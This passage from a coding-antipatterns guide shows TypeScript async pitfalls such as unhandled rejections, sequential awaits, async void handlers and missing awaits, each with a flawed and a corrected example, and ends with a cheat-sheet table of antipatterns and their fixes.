- In Node.js ≥ 15, unhandled rejections crash the process.

**Bad example (TypeScript):**
```typescript
// Fire-and-forget with no error handling
app.post("/upload", (req, res) => {
  storage.upload(req.file);           // Promise returned — never awaited, never caught
  db.logUpload(req.user.id, req.file.name);  // same problem

  res.json({ status: "processing" }); // We told the user it worked. Did it?
});
```

**Refactored example:**
```typescript
app.post("/upload", async (req, res) => {
  try {
    await storage.upload(req.file);
    await db.logUpload(req.user.id, req.file.name);
    res.json({ status: "processing" });
  } catch (err) {
    logger.error("Upload failed", { err });
    res.status(500).json({ error: "Upload failed. Please try again." });
  }
});

// If background fire-and-forget is intentional, always attach a catch:
storage.upload(req.file).catch((err) => {
  logger.error("Background upload failed", { err });
});
```

---

### 6.2 Sequential Awaits for Independent Operations

**Description:** Multiple `await` expressions are written one after another when the operations do not depend on each other — forcing them to run sequentially even though they could be parallelised.

**Why it's problematic:**
- If each operation takes 200ms, three sequential awaits take 600ms when they could take ~200ms in parallel.
- Entirely unnecessary latency added to every request.

**Bad example:**
```typescript
async function getDashboard(userId: string) {
  const user     = await db.getUser(userId);      // 100ms
  const orders   = await db.getOrders(userId);    // 150ms — waits for user unnecessarily
  const messages = await db.getMessages(userId);  // 120ms — waits for orders unnecessarily
  // Total: ~370ms
  return { user, orders, messages };
}
```

**Refactored example — use `Promise.all` for independent operations:**
```typescript
async function getDashboard(userId: string) {
  const [user, orders, messages] = await Promise.all([
    db.getUser(userId),       // \
    db.getOrders(userId),     //  all start simultaneously
    db.getMessages(userId),   // /
  ]);
  // Total: ~150ms (slowest individual operation)
  return { user, orders, messages };
}
```

**Caveat:** Only parallelise operations that are truly independent. If `getOrders` needs the result of `getUser`, it must remain sequential.

---

### 6.3 Async Void Functions

**Description:** An `async` function is declared with a `void` return type (or is used as a non-async event handler), causing any thrown error or rejected promise to disappear.

**Why it's problematic:**
- Errors thrown inside the function are silently lost — no error boundary, no log, nothing.
- The caller assumes success and continues.

**Bad example (TypeScript):**
```typescript
// TypeScript allows this — but any throw inside is unhandled
button.addEventListener("click", async () => {
  await saveData();   // if this rejects, the error is silently swallowed
  showSuccessToast();
});
```

**Refactored example:**
```typescript
button.addEventListener("click", () => {
  saveData()
    .then(() => showSuccessToast())
    .catch((err) => {
      logger.error("Save failed", err);
      showErrorToast("Save failed. Please try again.");
    });
});

// Or wrap in a utility that enforces error handling
function handleAsync(fn: () => Promise<void>): () => void {
  return () => fn().catch((err) => {
    logger.error("Unhandled async error", err);
    showErrorToast("Something went wrong.");
  });
}

button.addEventListener("click", handleAsync(async () => {
  await saveData();
  showSuccessToast();
}));
```

---

### 6.4 Missing Await (Silent Data Loss)

**Description:** A `async` function call is made without `await`, so the caller continues execution immediately — before the operation has completed. If the operation writes data or has side effects, they may never materialise.

**Why it's problematic:**
- No error is thrown; the code appears to work but the side effect is not guaranteed.
- Response is sent before the database write completes — the client thinks success but data may be lost.
- Intermittent failures that are nearly impossible to reproduce.

**Bad example:**
```typescript
async function createOrder(data: OrderData) {
  const order = await db.insertOrder(data);

  // Missing await — these fire but we don't wait for them
  notifyWarehouse(order.id);    // might not complete before function returns
  updateInventory(order.items); // same — race condition

  return order; // returned before side effects complete
}

// Express handler
app.post("/order", async (req, res) => {
  const order = await createOrder(req.body);
  res.json(order); // response sent; inventory update may still be in flight
});
```

**Refactored example:**
```typescript
async function createOrder(data: OrderData) {
  const order = await db.insertOrder(data);

  // Await all side effects that must complete before we consider this done
  await Promise.all([
    notifyWarehouse(order.id),
    updateInventory(order.items),
  ]);

  return order;
}
```

**Tip:** TypeScript's `@typescript-eslint/no-floating-promises` rule flags unawaited promises at compile time — enable it in your ESLint config.

---

## Quick Reference Cheat Sheet

| Category | Antipattern | Key Fix |
|---|---|---|
| Structure | God Class | Split by single responsibility |
| Structure | Long Method | Extract named helper functions |
| Structure | Deep Nesting | Guard clauses + early return |
| Structure | Primitive Obsession | Branded types / value objects |
| Logic | Boolean Blindness | Named enums / typed results |
| Logic | Stringly-Typed | Enums or union types |
| Logic | Magic Numbers | Named constants |
| Logic | Null Cascade | Explicit guards and fallbacks |
| Logic | Flag Arguments | Split into separate functions |
| Security | SQL Injection | Parameterised queries always |
| Security | Hardcoded Credentials | Environment variables + secrets manager |
| Security | XSS | Escape or sanitise all output |
| Security | IDOR | Authorisation check per resource |
| Security | Error Exposure | Log internally; return generic messages |
| Performance | N+1 Queries | JOINs or batch IN queries |
| Performance | Sync I/O in Hot Path | Async I/O or cache at startup |
| Performance | Unbounded Results | Mandatory pagination + limits |
| Performance | Repeated Computation | Memoize or cache with TTL |
| Testing | Excessive Mocking | Real / in-memory implementations |
| Testing | Testing Internals | Assert on observable behaviour |
| Testing | Flaky Tests | Inject clock/randomness |
| Testing | Copy-Paste Tests | Parameterised / table-driven tests |
| Async | Unhandled Rejections | Always `.catch()` or `try/catch` |
| Async | Sequential Awaits | `Promise.all` for independent work |
| Async | Async Void | Explicit error boundary wrapper |
| Async | Missing Await | `no-floating-promises` lint rule |

---

*Last updated: June 2026. Contributions welcome — open a PR against this file.*
